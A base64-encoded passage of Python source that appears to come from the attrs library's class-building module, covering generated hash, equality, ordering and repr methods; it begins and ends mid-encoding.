gZGVwZW5kcyBvbiB0aGUgdXNhZ2Ugb2YgdGhlIGRlY29yYXRvci4gIEl0XCdzIGEgY2xhc3NcbiAgICAjIGlmIGl0XCdzIHVzZWQgYXMgYEBhdHRyc2AgYnV0IGBgTm9uZWBgIGlmIHVzZWQgYXMgYEBhdHRycygpYC5cbiAgICBpZiBtYXliZV9jbHMgaXMgTm9uZTpcbiAgICAgICAgcmV0dXJuIHdyYXBcbiAgICBlbHNlOlxuICAgICAgICByZXR1cm4gd3JhcChtYXliZV9jbHMpXG5cblxuX2F0dHJzID0gYXR0cnNcbiIiIlxuSW50ZXJuYWwgYWxpYXMgc28gd2UgY2FuIHVzZSBpdCBpbiBmdW5jdGlvbnMgdGhhdCB0YWtlIGFuIGFyZ3VtZW50IGNhbGxlZFxuKmF0dHJzKi5cbiIiIlxuXG5cbmlmIFBZMjpcblxuICAgIGRlZiBfaGFzX2Zyb3plbl9iYXNlX2NsYXNzKGNscyk6XG4gICAgICAgICIiIlxuICAgICAgICBDaGVjayB3aGV0aGVyICpjbHMqIGhhcyBhIGZyb3plbiBhbmNlc3RvciBieSBsb29raW5nIGF0IGl0c1xuICAgICAgICBfX3NldGF0dHJfXy5cbiAgICAgICAgIiIiXG4gICAgICAgIHJldHVybiAoXG4gICAgICAgICAgICBnZXRhdHRyKGNscy5fX3NldGF0dHJfXywgIl9fbW9kdWxlX18iLCBOb25lKVxuICAgICAgICAgICAgPT0gX2Zyb3plbl9zZXRhdHRycy5fX21vZHVsZV9fXG4gICAgICAgICAgICBhbmQgY2xzLl9fc2V0YXR0cl9fLl9fbmFtZV9fID09IF9mcm96ZW5fc2V0YXR0cnMuX19uYW1lX19cbiAgICAgICAgKVxuXG5lbHNlOlxuXG4gICAgZGVmIF9oYXNfZnJvemVuX2Jhc2VfY2xhc3MoY2xzKTpcbiAgICAgICAgIiIiXG4gICAgICAgIENoZWNrIHdoZXRoZXIgKmNscyogaGFzIGEgZnJvemVuIGFuY2VzdG9yIGJ5IGxvb2tpbmcgYXQgaXRzXG4gICAgICAgIF9fc2V0YXR0cl9fLlxuICAgICAgICAiIiJcbiAgICAgICAgcmV0dXJuIGNscy5fX3NldGF0dHJfXyA9PSBfZnJvemVuX3NldGF0dHJzXG5cblxuZGVmIF9nZW5lcmF0ZV91bmlxdWVfZmlsZW5hbWUoY2xzLCBmdW5jX25hbWUpOlxuICAgICIiIlxuICAgIENyZWF0ZSBhICJmaWxlbmFtZSIgc3VpdGFibGUgZm9yIGEgZnVuY3Rpb24gYmVpbmcgZ2VuZXJhdGVkLlxuICAgICIiIlxuICAgIHVuaXF1ZV9maWxlbmFtZSA9ICI8YXR0cnMgZ2VuZXJhdGVkIHswfSB7MX0uezJ9PiIuZm9ybWF0KFxuICAgICAgICBmdW5jX25hbWUsXG4gICAgICAgIGNscy5fX21vZHVsZV9fLFxuICAgICAgICBnZXRhdHRyKGNscywgIl9fcXVhbG5hbWVfXyIsIGNscy5fX25hbWVfXyksXG4gICAgKVxuICAgIHJldHVybiB1bmlxdWVfZmlsZW5hbWVcblxuXG5kZWYgX21ha2VfaGFzaChjbHMsIGF0dHJzLCBmcm96ZW4sIGNhY2hlX2hhc2gpOlxuICAgIGF0dHJzID0gdHVwbGUoXG4gICAgICAgIGEgZm9yIGEgaW4gYXR0cnMgaWYgYS5oYXNoIGlzIFRydWUgb3IgKGEuaGFzaCBpcyBOb25lIGFuZCBhLmVxIGlzIFRydWUpXG4gICAgKVxuXG4gICAgdGFiID0gIiAgICAgICAgIlxuXG4gICAgdW5pcXVlX2ZpbGVuYW1lID0gX2dlbmVyYXRlX3VuaXF1ZV9maWxlbmFtZShjbHMsICJoYXNoIilcbiAgICB0eXBlX2hhc2ggPSBoYXNoKHVuaXF1ZV9maWxlbmFtZSlcblxuICAgIGhhc2hfZGVmID0gImRlZiBfX2hhc2hfXyhzZWxmIlxuICAgIGhhc2hfZnVuYyA9ICJoYXNoKCgiXG4gICAgY2xvc2luZ19icmFjZXMgPSAiKSkiXG4gICAgaWYgbm90IGNhY2hlX2hhc2g6XG4gICAgICAgIGhhc2hfZGVmICs9ICIpOiJcbiAgICBlbHNlOlxuICAgICAgICBpZiBub3QgUFkyOlxuICAgICAgICAgICAgaGFzaF9kZWYgKz0gIiwgKiJcblxuICAgICAgICBoYXNoX2RlZiArPSAoXG4gICAgICAgICAgICAiLCBfY2FjaGVfd3JhcHBlcj0iXG4gICAgICAgICAgICArICJfX2ltcG9ydF9fKFwnYXR0ci5fbWFrZVwnKS5fbWFrZS5fQ2FjaGVIYXNoV3JhcHBlcik6IlxuICAgICAgICApXG4gICAgICAgIGhhc2hfZnVuYyA9ICJfY2FjaGVfd3JhcHBlcigiICsgaGFzaF9mdW5jXG4gICAgICAgIGNsb3NpbmdfYnJhY2VzICs9ICIpIlxuXG4gICAgbWV0aG9kX2xpbmVzID0gW2hhc2hfZGVmXVxuXG4gICAgZGVmIGFwcGVuZF9oYXNoX2NvbXB1dGF0aW9uX2xpbmVzKHByZWZpeCwgaW5kZW50KTpcbiAgICAgICAgIiIiXG4gICAgICAgIEdlbmVyYXRlIHRoZSBjb2RlIGZvciBhY3R1YWxseSBjb21wdXRpbmcgdGhlIGhhc2ggY29kZS5cbiAgICAgICAgQmVsb3cgdGhpcyB3aWxsIGVpdGhlciBiZSByZXR1cm5lZCBkaXJlY3RseSBvciB1c2VkIHRvIGNvbXB1dGVcbiAgICAgICAgYSB2YWx1ZSB3aGljaCBpcyB0aGVuIGNhY2hlZCwgZGVwZW5kaW5nIG9uIHRoZSB2YWx1ZSBvZiBjYWNoZV9oYXNoXG4gICAgICAgICIiIlxuXG4gICAgICAgIG1ldGhvZF9saW5lcy5leHRlbmQoXG4gICAgICAgICAgICBbXG4gICAgICAgICAgICAgICAgaW5kZW50ICsgcHJlZml4ICsgaGFzaF9mdW5jLFxuICAgICAgICAgICAgICAgIGluZGVudCArICIgICAgICAgICVkLCIgJSAodHlwZV9oYXNoLCksXG4gICAgICAgICAgICBdXG4gICAgICAgIClcblxuICAgICAgICBmb3IgYSBpbiBhdHRyczpcbiAgICAgICAgICAgIG1ldGhvZF9saW5lcy5hcHBlbmQoaW5kZW50ICsgIiAgICAgICAgc2VsZi4lcywiICUgYS5uYW1lKVxuXG4gICAgICAgIG1ldGhvZF9saW5lcy5hcHBlbmQoaW5kZW50ICsgIiAgICAiICsgY2xvc2luZ19icmFjZXMpXG5cbiAgICBpZiBjYWNoZV9oYXNoOlxuICAgICAgICBtZXRob2RfbGluZXMuYXBwZW5kKHRhYiArICJpZiBzZWxmLiVzIGlzIE5vbmU6IiAlIF9oYXNoX2NhY2hlX2ZpZWxkKVxuICAgICAgICBpZiBmcm96ZW46XG4gICAgICAgICAgICBhcHBlbmRfaGFzaF9jb21wdXRhdGlvbl9saW5lcyhcbiAgICAgICAgICAgICAgICAib2JqZWN0Ll9fc2V0YXR0cl9fKHNlbGYsIFwnJXNcJywgIiAlIF9oYXNoX2NhY2hlX2ZpZWxkLCB0YWIgKiAyXG4gICAgICAgICAgICApXG4gICAgICAgICAgICBtZXRob2RfbGluZXMuYXBwZW5kKHRhYiAqIDIgKyAiKSIpICAjIGNsb3NlIF9fc2V0YXR0cl9fXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICBhcHBlbmRfaGFzaF9jb21wdXRhdGlvbl9saW5lcyhcbiAgICAgICAgICAgICAgICAic2VsZi4lcyA9ICIgJSBfaGFzaF9jYWNoZV9maWVsZCwgdGFiICogMlxuICAgICAgICAgICAgKVxuICAgICAgICBtZXRob2RfbGluZXMuYXBwZW5kKHRhYiArICJyZXR1cm4gc2VsZi4lcyIgJSBfaGFzaF9jYWNoZV9maWVsZClcbiAgICBlbHNlOlxuICAgICAgICBhcHBlbmRfaGFzaF9jb21wdXRhdGlvbl9saW5lcygicmV0dXJuICIsIHRhYilcblxuICAgIHNjcmlwdCA9ICJcXG4iLmpvaW4obWV0aG9kX2xpbmVzKVxuICAgIHJldHVybiBfbWFrZV9tZXRob2QoIl9faGFzaF9fIiwgc2NyaXB0LCB1bmlxdWVfZmlsZW5hbWUpXG5cblxuZGVmIF9hZGRfaGFzaChjbHMsIGF0dHJzKTpcbiAgICAiIiJcbiAgICBBZGQgYSBoYXNoIG1ldGhvZCB0byAqY2xzKi5cbiAgICAiIiJcbiAgICBjbHMuX19oYXNoX18gPSBfbWFrZV9oYXNoKGNscywgYXR0cnMsIGZyb3plbj1GYWxzZSwgY2FjaGVfaGFzaD1GYWxzZSlcbiAgICByZXR1cm4gY2xzXG5cblxuZGVmIF9tYWtlX25lKCk6XG4gICAgIiIiXG4gICAgQ3JlYXRlIF9fbmVfXyBtZXRob2QuXG4gICAgIiIiXG5cbiAgICBkZWYgX19uZV9fKHNlbGYsIG90aGVyKTpcbiAgICAgICAgIiIiXG4gICAgICAgIENoZWNrIGVxdWFsaXR5IGFuZCBlaXRoZXIgZm9yd2FyZCBhIE5vdEltcGxlbWVudGVkIG9yXG4gICAgICAgIHJldHVybiB0aGUgcmVzdWx0IG5lZ2F0ZWQuXG4gICAgICAgICIiIlxuICAgICAgICByZXN1bHQgPSBzZWxmLl9fZXFfXyhvdGhlcilcbiAgICAgICAgaWYgcmVzdWx0IGlzIE5vdEltcGxlbWVudGVkOlxuICAgICAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXG5cbiAgICAgICAgcmV0dXJuIG5vdCByZXN1bHRcblxuICAgIHJldHVybiBfX25lX19cblxuXG5kZWYgX21ha2VfZXEoY2xzLCBhdHRycyk6XG4gICAgIiIiXG4gICAgQ3JlYXRlIF9fZXFfXyBtZXRob2QgZm9yICpjbHMqIHdpdGggKmF0dHJzKi5cbiAgICAiIiJcbiAgICBhdHRycyA9IFthIGZvciBhIGluIGF0dHJzIGlmIGEuZXFdXG5cbiAgICB1bmlxdWVfZmlsZW5hbWUgPSBfZ2VuZXJhdGVfdW5pcXVlX2ZpbGVuYW1lKGNscywgImVxIilcbiAgICBsaW5lcyA9IFtcbiAgICAgICAgImRlZiBfX2VxX18oc2VsZiwgb3RoZXIpOiIsXG4gICAgICAgICIgICAgaWYgb3RoZXIuX19jbGFzc19fIGlzIG5vdCBzZWxmLl9fY2xhc3NfXzoiLFxuICAgICAgICAiICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWQiLFxuICAgIF1cblxuICAgICMgV2UgY2FuXCd0IGp1c3QgZG8gYSBiaWcgc2VsZi54ID0gb3RoZXIueCBhbmQuLi4gY2xhdXNlIGR1ZSB0b1xuICAgICMgaXJyZWd1bGFyaXRpZXMgbGlrZSBuYW4gPT0gbmFuIGlzIGZhbHNlIGJ1dCAobmFuLCkgPT0gKG5hbiwpIGlzIHRydWUuXG4gICAgZ2xvYnMgPSB7fVxuICAgIGlmIGF0dHJzOlxuICAgICAgICBsaW5lcy5hcHBlbmQoIiAgICByZXR1cm4gICgiKVxuICAgICAgICBvdGhlcnMgPSBbIiAgICApID09ICgiXVxuICAgICAgICBmb3IgYSBpbiBhdHRyczpcbiAgICAgICAgICAgIGlmIGEuZXFfa2V5OlxuICAgICAgICAgICAgICAgIGNtcF9uYW1lID0gIl8lc19rZXkiICUgKGEubmFtZSwpXG4gICAgICAgICAgICAgICAgIyBBZGQgdGhlIGtleSBmdW5jdGlvbiB0byB0aGUgZ2xvYmFsIG5hbWVzcGFjZVxuICAgICAgICAgICAgICAgICMgb2YgdGhlIGV2YWx1YXRlZCBmdW5jdGlvbi5cbiAgICAgICAgICAgICAgICBnbG9ic1tjbXBfbmFtZV0gPSBhLmVxX2tleVxuICAgICAgICAgICAgICAgIGxpbmVzLmFwcGVuZChcbiAgICAgICAgICAgICAgICAgICAgIiAgICAgICAgJXMoc2VsZi4lcyksIlxuICAgICAgICAgICAgICAgICAgICAlIChcbiAgICAgICAgICAgICAgICAgICAgICAgIGNtcF9uYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgYS5uYW1lLFxuICAgICAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgICAgIG90aGVycy5hcHBlbmQoXG4gICAgICAgICAgICAgICAgICAgICIgICAgICAgICVzKG90aGVyLiVzKSwiXG4gICAgICAgICAgICAgICAgICAgICUgKFxuICAgICAgICAgICAgICAgICAgICAgICAgY21wX25hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICBhLm5hbWUsXG4gICAgICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIGxpbmVzLmFwcGVuZCgiICAgICAgICBzZWxmLiVzLCIgJSAoYS5uYW1lLCkpXG4gICAgICAgICAgICAgICAgb3RoZXJzLmFwcGVuZCgiICAgICAgICBvdGhlci4lcywiICUgKGEubmFtZSwpKVxuXG4gICAgICAgIGxpbmVzICs9IG90aGVycyArIFsiICAgICkiXVxuICAgIGVsc2U6XG4gICAgICAgIGxpbmVzLmFwcGVuZCgiICAgIHJldHVybiBUcnVlIilcblxuICAgIHNjcmlwdCA9ICJcXG4iLmpvaW4obGluZXMpXG5cbiAgICByZXR1cm4gX21ha2VfbWV0aG9kKCJfX2VxX18iLCBzY3JpcHQsIHVuaXF1ZV9maWxlbmFtZSwgZ2xvYnMpXG5cblxuZGVmIF9tYWtlX29yZGVyKGNscywgYXR0cnMpOlxuICAgICIiIlxuICAgIENyZWF0ZSBvcmRlcmluZyBtZXRob2RzIGZvciAqY2xzKiB3aXRoICphdHRycyouXG4gICAgIiIiXG4gICAgYXR0cnMgPSBbYSBmb3IgYSBpbiBhdHRycyBpZiBhLm9yZGVyXVxuXG4gICAgZGVmIGF0dHJzX3RvX3R1cGxlKG9iaik6XG4gICAgICAgICIiIlxuICAgICAgICBTYXZlIHVzIHNvbWUgdHlwaW5nLlxuICAgICAgICAiIiJcbiAgICAgICAgcmV0dXJuIHR1cGxlKFxuICAgICAgICAgICAga2V5KHZhbHVlKSBpZiBrZXkgZWxzZSB2YWx1ZVxuICAgICAgICAgICAgZm9yIHZhbHVlLCBrZXkgaW4gKFxuICAgICAgICAgICAgICAgIChnZXRhdHRyKG9iaiwgYS5uYW1lKSwgYS5vcmRlcl9rZXkpIGZvciBhIGluIGF0dHJzXG4gICAgICAgICAgICApXG4gICAgICAgIClcblxuICAgIGRlZiBfX2x0X18oc2VsZiwgb3RoZXIpOlxuICAgICAgICAiIiJcbiAgICAgICAgQXV0b21hdGljYWxseSBjcmVhdGVkIGJ5IGF0dHJzLlxuICAgICAgICAiIiJcbiAgICAgICAgaWYgb3RoZXIuX19jbGFzc19fIGlzIHNlbGYuX19jbGFzc19fOlxuICAgICAgICAgICAgcmV0dXJuIGF0dHJzX3RvX3R1cGxlKHNlbGYpIDwgYXR0cnNfdG9fdHVwbGUob3RoZXIpXG5cbiAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXG5cbiAgICBkZWYgX19sZV9fKHNlbGYsIG90aGVyKTpcbiAgICAgICAgIiIiXG4gICAgICAgIEF1dG9tYXRpY2FsbHkgY3JlYXRlZCBieSBhdHRycy5cbiAgICAgICAgIiIiXG4gICAgICAgIGlmIG90aGVyLl9fY2xhc3NfXyBpcyBzZWxmLl9fY2xhc3NfXzpcbiAgICAgICAgICAgIHJldHVybiBhdHRyc190b190dXBsZShzZWxmKSA8PSBhdHRyc190b190dXBsZShvdGhlcilcblxuICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcblxuICAgIGRlZiBfX2d0X18oc2VsZiwgb3RoZXIpOlxuICAgICAgICAiIiJcbiAgICAgICAgQXV0b21hdGljYWxseSBjcmVhdGVkIGJ5IGF0dHJzLlxuICAgICAgICAiIiJcbiAgICAgICAgaWYgb3RoZXIuX19jbGFzc19fIGlzIHNlbGYuX19jbGFzc19fOlxuICAgICAgICAgICAgcmV0dXJuIGF0dHJzX3RvX3R1cGxlKHNlbGYpID4gYXR0cnNfdG9fdHVwbGUob3RoZXIpXG5cbiAgICAgICAgcmV0dXJuIE5vdEltcGxlbWVudGVkXG5cbiAgICBkZWYgX19nZV9fKHNlbGYsIG90aGVyKTpcbiAgICAgICAgIiIiXG4gICAgICAgIEF1dG9tYXRpY2FsbHkgY3JlYXRlZCBieSBhdHRycy5cbiAgICAgICAgIiIiXG4gICAgICAgIGlmIG90aGVyLl9fY2xhc3NfXyBpcyBzZWxmLl9fY2xhc3NfXzpcbiAgICAgICAgICAgIHJldHVybiBhdHRyc190b190dXBsZShzZWxmKSA+PSBhdHRyc190b190dXBsZShvdGhlcilcblxuICAgICAgICByZXR1cm4gTm90SW1wbGVtZW50ZWRcblxuICAgIHJldHVybiBfX2x0X18sIF9fbGVfXywgX19ndF9fLCBfX2dlX19cblxuXG5kZWYgX2FkZF9lcShjbHMsIGF0dHJzPU5vbmUpOlxuICAgICIiIlxuICAgIEFkZCBlcXVhbGl0eSBtZXRob2RzIHRvICpjbHMqIHdpdGggKmF0dHJzKi5cbiAgICAiIiJcbiAgICBpZiBhdHRycyBpcyBOb25lOlxuICAgICAgICBhdHRycyA9IGNscy5fX2F0dHJzX2F0dHJzX19cblxuICAgIGNscy5fX2VxX18gPSBfbWFrZV9lcShjbHMsIGF0dHJzKVxuICAgIGNscy5fX25lX18gPSBfbWFrZV9uZSgpXG5cbiAgICByZXR1cm4gY2xzXG5cblxuaWYgSEFTX0ZfU1RSSU5HUzpcblxuICAgIGRlZiBfbWFrZV9yZXByKGF0dHJzLCBucywgY2xzKTpcbiAgICAgICAgdW5pcXVlX2ZpbGVuYW1lID0gX2dlbmVyYXRlX3VuaXF1ZV9maWxlbmFtZShjbHMsICJyZXByIilcbiAgICAgICAgIyBGaWd1cmUgb3V0IHdoaWNoIGF0dHJpYnV0ZXMgdG8gaW5jbHVkZSwgYW5kIHdoaWNoIGZ1bmN0aW9uIHRvIHVzZSB0b1xuICAgICAgICAjIGZvcm1hdCB0aGVtLiBUaGUgYS5yZXByIHZhbHVlIGNhbiBiZSBlaXRoZXIgYm9vbCBvciBhIGN1c3RvbVxuICAgICAgICAjIGNhbGxhYmxlLlxuICAgICAgICBhdHRyX25hbWVzX3dpdGhfcmVwcnMgPSB0dXBsZShcbiAgICAgICAgICAgIChhLm5hbWUsIChyZXByIGlmIGEucmVwciBpcyBUcnVlIGVsc2UgYS5yZXByKSwgYS5pbml0KVxuICAgICAgICAgICAgZm9yIGEgaW4gYXR0cnNcbiAgICAgICAgICAgIGlmIGEucmVwciBpcyBub3QgRmFsc2VcbiAgICAgICAgKVxuICAgICAgICBnbG9icyA9IHtcbiAgICAgICAgICAgIG5hbWUgKyAiX3JlcHIiOiByXG4gICAgICAgICAgICBmb3IgbmFtZSwgciwgXyBpbiBhdHRyX25hbWVzX3dpdGhfcmVwcnNcbiAgICAgICAgICAgIGlmIHIgIT0gcmVwclxuICAgICAgICB9XG4gICAgICAgIGdsb2JzWyJfY29tcGF0Il0gPSBfY29tcGF0XG4gICAgICAgIGdsb2JzWyJBdHRyaWJ1dGVFcnJvciJdID0gQXR0cmlidXRlRXJyb3JcbiAgICAgICAgZ2xvYnNbIk5PVEhJTkciXSA9IE5PVEhJTkdcbiAgICAgICAgYXR0cmlidXRlX2ZyYWdtZW50cyA9IFtdXG4gICAgICAgIGZvciBuYW1lLCByLCBpIGluIGF0dHJfbmFtZXNfd2l0aF9yZXByczpcbiAgICAgICAgICAgIGFjY2Vzc29yID0gKFxuICAgICAgICAgICAgICAgICJzZWxmLiIgKyBuYW1lXG4gICAgICAgICAgICAgICAgaWYgaVxuICAgICAgICAgICAgICAgIGVsc2UgXCdnZXRhdHRyKHNlbGYsICJcJyArIG5hbWUgKyBcJyIsIE5PVEhJTkcpXCdcbiAgICAgICAgICAgIClcbiAgICAgICAgICAgIGZyYWdtZW50ID0gKFxuICAgICAgICAgICAgICAgICIlcz17JXMhcn0iICUgKG5hbWUsIGFjY2Vzc29yKVxuICAgICAgICAgICAgICAgIGlmIHIgPT0gcmVwclxuICAgICAgICAgICAgICAgIGVsc2UgIiVzPXslc19yZXByKCVzKX0iICUgKG5hbWUsIG5hbWUsIGFjY2Vzc29yKVxuICAgICAgICAgICAgKVxuICAgICAgICAgICAgYXR0cmlidXRlX2ZyYWdtZW50cy5hcHBlbmQoZnJhZ21lbnQpXG4gICAgICAgIHJlcHJfZnJhZ21lbnQgPSAiLCAiLmpvaW4oYXR0cmlidXRlX2ZyYWdtZW50cylcblxuICAgICAgICBpZiBucyBpcyBOb25lOlxuICAgICAgICAgICAgY2xzX25hbWVfZnJhZ21lbnQgPSAoXG4gICAgICAgICAgICAgICAgXCd7c2VsZi5fX2NsYXNzX18uX19xdWFsbmFtZV9fLnJzcGxpdCgiPi4iLCAxKVstMV19XCdcbiAgICAgICAgICAgIClcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIGNsc19uYW1lX2ZyYWdtZW50ID0gbnMgKyAiLntzZWxmLl9fY2xhc3NfXy5fX25hbWVfX30iXG5cbiAgICAgICAgbGluZXMgPSBbXG4gICAgICAgICAgICAiZGVmIF9fcmVwcl9fKHNlbGYpOiIsXG4gICAgICAgICAgICAiICB0cnk6IixcbiAgICAgICAgICAgICIgICAgYWxyZWFkeV9yZXByaW5nID0gX2NvbXBhdC5yZXByX2NvbnRleHQuYWxyZWFkeV9yZXByaW5nIixcbiAgICAgICAgICAgICIgIGV4Y2VwdCBBdHRyaWJ1dGVFcnJvcjoiLFxuICAgICAgICAgICAgIiAgICBhbHJlYWR5X3JlcHJpbmcgPSB7aWQoc2VsZiksfSIsXG4gICAgICAgICAgICAiICAgIF9jb21wYXQucmVwcl9jb250ZXh0LmFscmVhZHlfcmVwcmluZyA9IGFscmVhZHlfcmVwcmluZyIsXG4gICAgICAgICAgICAiICBlbHNlOiIsXG4gICAgICAgICAgICAiICAgIGlmIGlkKHNlbGYpIGluIGFscmVhZHlfcmVwcmluZzoiLFxuICAgICAgICAgICAgIiAgICAgIHJldHVybiBcJy4uLlwnIixcbiAgICAgICAgICAgICIgICAgZWxzZToiLFxuICAgICAgICAgICAgIiAgICAgIGFscmVhZHlfcmVwcmluZy5hZGQoaWQoc2VsZikpIixcbiAgICAgICAgICAgICIgIHRyeToiLFxuICAgICAgICAgICAgIiAgICByZXR1cm4gZlwnJXMoJXMpXCciICUgKGNsc19uYW1lX2ZyYWdtZW50LCByZXByX2ZyYWdtZW50KSxcbiAgICAgICAgICAgICIgIGZpbmFsbHk6IixcbiAgICAgICAgICAgICIgICAgYWxyZWFkeV9yZXByaW5nLnJlbW92ZShpZChzZWxmKSkiLFxuICAgICAgICBdXG5cbiAgICAgICAgcmV0dXJuIF9tYWtlX21ldGhvZChcbiAgICAgICAgICAgICJfX3JlcHJfXyIsICJcXG4iLmpvaW4obGluZXMpLCB1bmlxdWVfZmlsZW5hbWUsIGdsb2JzPWdsb2JzXG4gICAgICAgIClcblxuZWxzZTpcblxuICAgIGRlZiBfbWFrZV9yZXByKGF0dHJzLCBucywgXyk6XG4gICAgICAgICIiIlxuICAgICAgICBNYWtlIGEgcmVwciBtZXRob2QgdGhhdCBpbmNsdWRlcyByZWxldmFudCAqYXR0cnMqLCBhZGRpbmcgKm5zKiB0byB0aGVcbiAgICAgICAgZnVsbCBuYW1lLlxuICAgICAgICAiIiJcblxuICAgICAgICAjIEZpZ3VyZSBvdXQgd2hpY2ggYXR0cmlidXRlcyB0byBpbmNsdWRlLCBhbmQgd2hpY2ggZnVuY3Rpb24gdG8gdXNlIHRvXG4gICAgICAgICMgZm9ybWF0IHRoZW0uIFRoZSBhLnJlcHIgdmFsdWUgY2FuIGJlIGVpdGhlciBib29sIG9yIGEgY3VzdG9tXG4gICAgICAgICMgY2FsbGFibGUuXG4gICAgICAgIGF0dHJfbmFtZXNfd2l0aF9yZXBycyA9IHR1cGxlKFxuICAgICAgICAgICAgKGEubmFtZSwgcmVwciBpZiBhLnJlcHIgaXMgVHJ1ZSBlbHNlIGEucmVwcilcbiAgICAgICAgICAgIGZvciBhIGluIGF0dHJzXG4gICAgICAgICAgICBpZiBhLnJlcHIgaXMgbm90IEZhbHNlXG4gICAgICAgIClcblxuICAgICAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgICAgICAiIiJcbiAgICAgICAgICAgIEF1dG9tYXRpY2FsbHkgY3JlYXRlZCBieSBhdHRycy5cbiAgICAgICAgICAgICIiIlxuICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgIGFscmVhZHlfcmVwcmluZyA9IF9jb21wYXQucmVwcl9jb250ZXh0LmFscmVhZHlfcmVwcmluZ1xuICAgICAgICAgICAgZXhjZXB0IEF0dHJpYnV0ZUVycm9yOlxuICAgICAgICAgICAgICAgIGFscmVhZHlfcmVwcmluZyA9IHNldCgpXG4gICAgICAgICAgICAgICAgX2NvbXBhdC5yZXByX2NvbnRleHQuYWxyZWFkeV9yZXByaW5nID0gYWxyZWFkeV9yZXByaW5nXG5cbiAgICAgICAgICAgIGlmIGlkKHNlbGYpIGluIGFscmVhZHlfcmVwcmluZzpcbiAgICAgICAgICAgICAgICByZXR1cm4gIi4uLiJcbiAgICAgICAgICAgIHJlYWxfY2xzID0gc2VsZi5fX2NsYXNzX19cbiAgICAgICAgICAgIGlmIG5zIGlzIE5vbmU6XG4gICAgICAgICAgICAgICAgcXVhbG5hbWUgPSBnZXRhdHRyKHJlYWxfY2xzLCAiX19xdWFsbmFtZV9fIiwgTm9uZSlcbiAgICAgICAgICAgICAgICBpZiBxdWFsbmFtZSBpcyBub3QgTm9uZTogICMgcHJhZ21hOiBubyBjb3ZlclxuICAgICAgICAgICAgICAgICAgICAjIFRoaXMgY2FzZSBvbmx5IGhhcHBlbnMgb24gUHl0aG9uIDMuNSBhbmQgMy42LiBXZSBleGNsdWRlXG4gICAgICAgICAgICAgICAgICAgICMgaXQgZnJvbSBjb3ZlcmFnZSwgYmVjYXVzZSB3ZSBkb25cJ3Qgd2FudCB0byBzbG93IGRvd24gb3VyXG4gICAgICAgICAgICAgICAgICAgICMgdGVzdCBzdWl0ZSBieSBydW5uaW5nIHRoZW0gdW5kZXIgY292ZXJhZ2UgdG9vIGZvciB0aGlzXG4gICAgICAgICAgICAgICAgICAgICMgb25lIGxpbmUuXG4gICAgICAgICAgICAgICAgICAgIGNsYXNzX25hbWUgPSBxdWFsbmFtZS5yc3BsaXQoIj4uIiwgMSlbLTFdXG4gICAgICAgICAgICAgICAgZWxzZTpcbiAgICAgICAgICAgICAgICAgICAgY2xhc3NfbmFtZSA9IHJlYWxfY2xzLl9fbmFtZV9fXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIGNsYXNzX25hbWUgPSBucyArICIuIiArIHJlYWxfY2xzLl9fbmFtZV9fXG5cbiAgICAgICAgICAgICMgU2luY2UgXCdzZWxmXCcgcmVtYWlucyBvbiB0aGUgc3RhY2sgKGkuZS46IHN0cm9uZ2x5IHJlZmVyZW5jZWQpXG4gICAgICAgICAgICAjIGZvciB0aGUgZHVyYXRpb24gb2YgdGhpcyBjYWxsLCBpdFwncyBzYWZlIHRvIGRlcGVuZCBvbiBpZCguLi4pXG4gICAgICAgICAgICAjIHN0YWJpbGl0eSwgYW5kIG5vdCBuZWVkIHRvIHRyYWNrIHRoZSBpbnN0YW5jZSBhbmQgdGhlcmVmb3JlXG4gICAgICAgICAgICAjIHdvcnJ5IGFib3V0IHByb3BlcnRpZXMgbGlrZSB3ZWFrcmVmLSBvciBoYXNoLWFiaWxpdHkuXG4gICAgICAgICAgICBhbHJlYWR5X3JlcHJpbmcuYWRkKGlkKHNlbGYpKVxuICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgIHJlc3VsdCA9IFtjbGFzc19uYW1lLCAiKCJdXG4gICAgICAgICAgICAgICAgZmlyc3QgPSBUcnVlXG4gICAgICAgICAgICAgICAgZm9yIG5hbWUsIGF0dHJfcmVwciBpbiBhdHRyX25hbWVzX3dpdGhfcmVwcnM6XG4gICAgICAgICAgICAgICAgICAgIGlmIGZpcnN0OlxuICAgICAgICAgICAgICAgICAgICAgICAgZmlyc3QgPSBGYWxzZVxuICAgICAgICAgICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0LmFwcGVuZCgiLCAiKVxuICAgICAgICAgICAgICAgICAgICByZXN1bHQuZXh0ZW5kKFxuICAgICAgICAgICAgICAgICAgICAgICAgKG5hbWUsICI9IiwgYXR0cl9yZXByKGdldGF0dHIoc2VsZiwgbmFtZSwgTk9USElORykpKVxuICAgICAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgcmV0dXJuICIiLmpvaW4ocmVzdWx0KSArICIpIlxuICAgICAgICAgICAgZmluYWxseTpcbiAgICAgICAgICAgICAgICBhbHJlYWR5X3JlcHJpbmcucmVtb3ZlKGlkKHNlbGYpKVxuXG4gICAgICAgIHJldHVybiBfX3JlcHJfX1xuXG5cbmRlZiBfYWRkX3JlcHIoY2xzLCBucz1Ob25lLCBhdHRycz1Ob25lKTpcbiAgICAiIiJcbiAgICBBZGQgYSByZXByIG1ldGhvZCB0byAqY2xzKi5cbiAgICAiIiJcbiAgICBpZiBhdHRycyBpcyBOb25lOlxuICAgICAgICBhdHRycyA9IGNscy5fX2F0dHJzX2F0dHJzX19cblxuICAgIGNscy5fX3JlcHJfXyA9IF9tYWtlX3JlcHIoYXR0cnMsIG5zLCBjbHMpXG4gICAgcmV0dXJuIGNsc1xuXG5cbmRlZiBmaWVsZHMoY2xzKTpcbiAgICAiIiJcbiAgICBSZXR1cm4gdGhlIHR1cGxlIG9mIGBgYXR0cnNgYCBhdHRyaWJ1dGVzIGZvciBhIGNs